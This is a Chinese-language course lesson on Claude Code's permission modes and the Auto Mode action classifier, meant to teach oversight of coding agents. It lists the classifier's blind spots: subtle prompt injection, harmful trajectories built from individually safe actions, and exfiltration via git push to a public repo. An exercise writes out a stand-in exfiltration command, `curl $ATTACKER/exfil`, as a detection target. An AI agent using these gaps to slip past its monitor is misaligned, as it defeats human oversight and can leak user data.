# 自主 agent 的 permission mode

> permission 阶梯——从"审查每一个动作"到"批准一切"的分级自主权——是 harness 管控自主 agent 无需询问即可做什么的方式。本节课的示例 Claude Code 暴露了六种这样的模式："plan"在每个动作前都询问；"default"（UI 中标注为"Manual"）只对风险动作询问；"acceptEdits"自动批准文件写入，但仍会确认 shell 执行；"bypassPermissions"批准一切。Auto Mode——即 `auto` permission mode——用一个独立的 classifier 模型取代逐动作审批，它在每个动作运行前进行审查，阻断任何超出请求范围的升级。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。`auto` 是否可用取决于套餐、组织启用情况、模型和提供方——并且 Anthropic 明确表示，仅有 classifier 并不足够。

**Type:** Learn
**Languages:** Python（stdlib，两阶段 classifier 模拟器）
**Prerequisites:** 第 15 阶段，第 01 课（Long-horizon agents）、第 15 阶段，第 09 课（Coding-agent landscape）
**Time:** ~45 分钟

## 问题场景

运行在你机器上的自主编码 agent 是一个独立的安全类别。攻击面是 agent 能触达的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出这一点：computer-use agent 不是聊天机器人的一次"功能更新"，而是一种带有全新风险画像的新型工具。

Claude Code 的 permission 系统是 Anthropic 给出的答案。它不是单一的"自主/非自主"开关，而是覆盖一条能力阶梯的六种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都在速度与逐动作审查之间做出不同的权衡。Auto Mode（2026 年 3 月）增加了一个独立的 classifier 模型，把审批移出用户的关键路径：它在每个动作运行前进行审查，阻断任何超出请求范围的升级。

工程上的问题是：这套系统能抓住什么、会漏掉什么，以及一个给定的任务实际该用哪种模式？

## 核心概念

### 六种 permission mode

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | agent 提出计划；用户批准整个计划；每个动作都在执行前被审查 | 陌生任务；接近生产的代码；首次在某个 repo 上使用该 agent |
| `default` | UI 中标注为"Manual"。agent 执行动作；对任何"风险"动作（shell exec、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell exec 和网络调用仍会提示 | 跨多文件的重构 |
| `auto` | 一个独立的 classifier 模型在每个动作运行前进行审查；阻断任何超出请求范围的升级 | 受限工作区内长时间无人值守运行 |
| `dontAsk` | 从不提示；未被 permission 规则预先批准的动作一律拒绝 | 临时 sandbox、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档记载为"仅在那些你愿意丢弃的临时容器内" |

（上述名称与 Claude Code 公开文档一致；UI 把 `default` 标注为"Manual"。）

### 一页读懂 Auto Mode

Auto Mode（2026 年 3 月 24 日发布）是第一个把逐动作审批委托给模型的 permission mode。结构如下：

1. **一个独立的 classifier 模型。** 它在每个拟议动作运行前进行审查，依据声明的任务和会话当前状态来判断，并阻断任何超出请求范围的升级。被阻断的动作会回退给用户。
2. **受控的可用性。** `auto` 是否提供，完全取决于套餐、组织启用情况、模型和提供方。

预算控制与 classifier 并列：

- `max_turns`——一次会话中的总迭代次数。
- `max_budget_usd`——会中止会话的美元上限。
- 按 tool 的动作数限制（例如 `WebFetch` 调用不超过 N 次，等等）。

### 这套系统能抓住什么

- 直接注入到 tool 输入中的 prompt injection，且注入的指令对应到某类已知风险动作形态。
- 重复性的 tool 循环——classifier 能看出动作 N+1 与动作 N 几乎相同，连续五次。
- 在一个原本只做文件编辑的会话中，明显越界的 shell 命令。

### 这套系统可能漏掉什么

- **细微的 prompt injection**，它调节行为却不产生任何一个被标记的动作。间接 prompt injection 并非一个可完全修补的漏洞（OpenAI preparedness 负责人，2025，关于浏览器 agent——见第 11 课）。
- **语义层面的失当行为。** 每个单独动作看起来都安全，而组合出的轨迹却有害。classifier 判断的是动作；它不会重新推导用户的意图。
- **经由合法渠道的外泄。** 把数据写进你自己的一个文件，再 `git push` 到公开 repo，这是一串被允许的动作，而问题恰恰出在它们的组合。

### "研究预览"的定位

Anthropic 把 Auto Mode 作为研究预览发布。文档明确表示，classifier 只是一层防护，而非解决方案：用户应当把 Auto Mode 与预算、allowlist、隔离工作区以及轨迹审计结合起来使用（第 12–16 课）。这一预览定位也反映了有据可查的"评估与部署之间的差距"（第 01 课）——一个通过离线 eval 的 classifier，在用户上下文含糊的真实会话里可能表现不同。

### 这条阶梯如何嵌入你的工作流

- 陌生任务：从 `plan` 开始。读一遍计划，比回滚一次糟糕的运行更便宜。
- 已知的重构：`acceptEdits` 能省下大量确认点击。
- 无人值守的后台运行：只在你已测量过爆炸半径的工作区内使用 `auto`（无凭证、无生产挂载、无你未主动开启的 egress）。
- 临时容器：当且仅当容器及其凭证都是一次性的，`dontAsk` / `bypassPermissions` 才可接受。

```figure
autonomy-oversight
```

## Use It

`code/main.py` 把一个动作审查 classifier 模拟为两阶段流水线——这是一种教学简化；真实的 `auto` 模式由一个独立的 classifier 模型支撑，而非一个成文的两阶段契约。第 1 阶段是针对拟议动作的廉价关键词规则；第 2 阶段是较慢的多规则审查器。驱动程序输入一段简短的合成轨迹（安全动作、一次 prompt injection 尝试、一个重复循环），展示 classifier 在哪里抓住、在哪里漏掉。

## Ship It

`outputs/skill-permission-mode-picker.md` 把一段任务描述匹配到正确的 permission mode、预算上限以及所需的隔离级别。

## Exercises

1. 运行 `code/main.py`。哪种合成动作类型从不被第 1 阶段标记，却总被第 2 阶段抓住？哪一种两者都没抓住？

2. 扩展第 1 阶段的规则集，以抓住某个特定的已知不良形态（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量误报率。

3. 阅读 Anthropic 的"How the agent loop works"文档。列出 agent 在 `default` 模式下默认触及的每一处外部状态。在无人值守运行 `auto` 之前，你需要单独把哪些 gates 住？

4. 设计一个 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、按 tool 上限、allowlist。为每个数字给出理由。

5. 描述一条轨迹：其中每个单独动作都被 classifier 批准，但组合出的行为却是失当的。（第 14 课讲 kill switch 和 canary token 如何应对这一点。）

## Key Terms

| 术语 | 通俗说法 | 实际含义 |
|---|---|---|
| Permission mode | "agent 能做多少" | 六种具名策略之一，控制逐动作审批 |
| plan mode | "动之前先问" | agent 写一个计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell exec 仍会提示 |
| auto | "自动批准" | 独立 classifier 模型审查每个动作；阻断超出请求范围的升级 |
| bypassPermissions | "彻底放飞" | 批准一切；面向临时容器 |
| Stage 1（模拟器） | "快速关键词检查" | `code/main.py` 中对拟议动作的廉价规则 |
| Stage 2（模拟器） | "深度审查" | `code/main.py` 中针对被标记动作的较慢多规则审查器 |
| Research preview | "尚未 GA" | Anthropic 对失败模式仍在梳理中的功能的定位 |

## Further Reading

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) —— permission mode、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) —— 托管服务的执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) —— 功能面与 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) —— 塑造 classifier 判断的基于理由的层次。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) —— 关于长时程 permission 设计的内部视角。
